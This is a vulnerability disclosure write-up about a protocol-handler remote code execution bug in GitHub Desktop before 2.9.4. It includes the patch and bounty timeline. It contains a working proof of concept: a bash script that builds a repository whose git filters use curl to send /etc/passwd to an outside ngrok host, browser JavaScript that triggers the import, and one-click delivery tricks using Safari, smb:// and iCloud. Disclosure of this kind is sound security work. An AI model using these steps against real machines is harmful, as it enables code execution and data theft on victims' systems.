# RCE in [GitHub Desktop](https://github.com/desktop/desktop) < 2.9.4

![](github_desktop_openlocalrepo_safari.gif)

**[High-res Safari PoC screencast](https://drive.google.com/file/d/1QTEtoT_RyZz3ZtFpND82rD_nyXKHDF8L/view?usp=sharing)**


- [RCE in GitHub Desktop < 2.9.4](#rce-in-github-desktop--294)
- [Intro](#intro)
- [Summary](#summary)
- [Details (< v2.9.4)](#details--v294)
  - ["openlocalrepo" URL command](#openlocalrepo-url-command)
  - [Crafting a "poisoned" git repository](#crafting-a-poisoned-git-repository)
  - [Achieving code execution](#achieving-code-execution)
  - [Delivering a malicious repository on local FS](#delivering-a-malicious-repository-on-local-fs)
  - [Attack scenarios](#attack-scenarios)
- [Impact & fix](#impact--fix)

# Intro

It's obvious why `git` was [selected by Google](news/google-commits-to-solving-security-problems-in-open-source-projects-like-git-and-laravel/) for a security audit as a top-priority open-source project git.

`git` is a dumb version tracker used by every software engineer for collaboration.

`git`'s destiny is to make developers' collaboration efficient. Therefore, `git` needs different functionalities that execute local programs for remote communication, compression, code diffing, and formatting.

On top of this, git is a fundamental primitive for deploying, scaling, and managing source code and releases. Things like git-lfs make git accessible to a broad scope of potential users.

# Summary

`openlocalrepo` [URI command](https://github.com/desktop/desktop/blob/18238077aa1e4851e710cfa66587cd4fd597bacd/app/src/cli/commands/open.ts#L35) in GitHub Desktop < 2.9.4 allows importing a crafted repository with malicious payload in `/.git/config` on the targeted machine leading to code execution.

# Details (< v2.9.4)

## "openlocalrepo" URL command

Unlike `openrepo` URI command, `openlocalrepo` doesn't ask the user to confirm local repository import.
`github-mac://openlocalrepo/<path_to_local_repo>` command immediately imports the specified local repository into GitHub Desktop app.

## Crafting a "poisoned" git repository

It's possible to insert malicious git configuration in `.git/config`. Of course, it's impossible to drop such a repo through `git clone`, but who said we need `git clone`?

```bash
mkdir -p /tmp/evil
cd /tmp/evil
git init
cat > ./.git/config<<- EOM
[filter "any"]
    smudge = curl --data-binary "@/etc/passwd" https://metnew.ngrok.io/smudge
    clean = curl --data-binary "@/etc/passwd" https://metnew.ngrok.io/clean
EOM
touch example
git add ./example
git commit -m 'commit'
echo "*  text  filter=any" > .gitattributes
```

> Make sure to replace the test payload
> To confirm the config is poisoned, run `git status` inside the repo

This repo has [git filters](https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes) that GitHub Desktop will execute as soon as the repo is imported into the app.
When Desktop imports the repo, it'll run `any` filter for `.gitattributes` because this file hasn't been committed yet.

## Achieving code execution

At this point, we know the following things:

- importing a local repo using `openlocalrepo` URI command doesn't require user confirmation (except for running the URL command in the browser).
- importing a local repo may lead to code execution

That means **running a URL command can lead to malicious code execution**.

## Delivering a malicious repository on local FS

Approach to payload delivery depends on what we already know about the target, specifically:

**Q:** What's the targeted device's OS/browser/username?

> it's possible to guess OS/browser from User-Agent
> it's possible to uncover OS username by navigating user browser to `ssh://` link (if the user confirms -> an SSH session will start with the current username).
> There are other esoteric methods like stealing the OS username by sending an HTML file to the target (and disclosing the full path using JS later).

**Safari: `"Open 'safe' files"` isn't that safe**

**By default**, Safari has **"Open 'safe' files after downloading"** option enabled.
Thus, running `location.href = "./payload.zip"` makes Safari unzipping the archive to `~/Downloads/evil` **without any user interaction**.

**Delivering malicious files with `smb://`**

If it's macOS or Windows, we can drop the folder with `location.href="smb://publicshare"`
In macOS, it requires not more than a single click from the targeted user.

**Esoteric methods: Keybase, Google Drive, etc.**

I described some alternative payload delivery methods (Keybase, GDrive, iCloud, etc.) in [this write-up about `.terminal` files](https://medium.com/@metnew/exploiting-popular-macos-apps-with-a-single-terminal-file-f6c2efdfedaa).

**Delivering the payload w iCloud links (macOS 10.15)**

URLs like `icloud-sharing://www.icloud.com/iclouddrive/0sW3_56zbqY0Exxxxxxxxxxxx#evil` on macOS 10.15 automatically download folders from the web to the user's local iCloud files.

**Delivery summary**

**Hypothesis**: delivering a malicious folder to the device doesn't require more than one click from the target.

> Because `smb://` strategy allows doing this on both macOS and Win in no more than one click and **doesn't have any specific requirements** (e.g., OS username, OS settings, etc.).

> **NOTE:** I don't have a Win machine. But from what I remember, Win could mount public shares without triggering a dialog at all. Can someone check this, please?

## Attack scenarios

**Safari attack scenario**

**[PoC Screencast](https://drive.google.com/file/d/1QTEtoT_RyZz3ZtFpND82rD_nyXKHDF8L/view?usp=sharing)**

1. User visits the attacker's website
2. The website downloads a malicious archive. The archive with the malicious repo is extracted to `/Users/user/Downloads/archive`
3. The website runs `location.href = 'github-mac://openlocalrepo//Users/user/Downloads/archive'`.
4. pwn.

**smb:// attack scenario**

**[PoC Screencast](https://drive.google.com/file/d/1QNDr_qzO-KpKMbKEbZ5YW0IhxBHLuJ_e/view?usp=sharing)**

> PoC took a bit long, but it's possible to fine-tune the smb server to skip that pause I had in the screencast

1. User visits the attacker's website
2. The website opens `location.href = "smb://guest:guest@publicshare"`. (user confirms)
3. The archive with the malicious repo is mounted to `/Volumes/share/evil`
4. The website runs `location.href = 'github-mac://openlocalrepo//Volumes/share/evil'`.
5. pwn.

# Impact & fix

Attacker can run arbitrary code on the targeted device using Github Desktop protocol handler.

As of version 2.9.4, GitHub Desktop asks for confirmation when opening a local repository :)

See [this PR](https://github.com/desktop/desktop/pull/12935).

**Timeline**

- Aug 29, 2021 - initial report
- Sep 9, 2021 - the vulnerability is confirmed
- Sep 10 2021 - pull request with [fix](https://github.com/desktop/desktop/pull/12935) is available.
- Sep 10, 2021 - GitHub awarded $2K bounty.

**Bounty concerns**

I had a slight feeling the bounty was too small. Similar bugs in GitHub Desktop were awarded $5K and $10K bounties. GitHub declares they pay bounties only for Critical issues. The above-described vulnerability requires conditions to exploit, so GitHub Security Team decided to track it as a low severity issue. I'm somewhat ok with this. Maybe I was just too much excited about my finding :)

**Further research**

In the following write-up, I'll share how I made over $50K+ on some git bugs and features. Stay tuned :)
